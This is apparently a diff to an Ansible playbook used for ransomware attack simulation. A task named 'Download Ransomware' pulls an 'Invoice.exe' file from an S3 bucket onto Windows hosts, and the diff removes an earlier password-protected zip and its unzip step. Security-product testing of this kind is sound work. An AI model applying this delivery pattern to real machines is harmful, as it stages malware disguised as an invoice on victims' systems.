@@ -5,15 +5,10 @@
   tasks:
   - name: Download Ransomware
     win_get_url:
-       url: https://product-experience-attack-platform.s3.us-east-2.amazonaws.com/Invoice.zip
-       dest: c:\Invoice.zip
+       url: https://product-experience-attack-platform.s3.us-east-2.amazonaws.com/Invoice.exe
+       dest: c:\Invoice.exe
     
-  - name: Unzip .7z file which is password encrypted
-    community.windows.win_unzip:
-      src: C:\Invoice.zip
-      dest: C:\
-      password: trendmicro
-      delete_archive: yes
+  
     
   
   
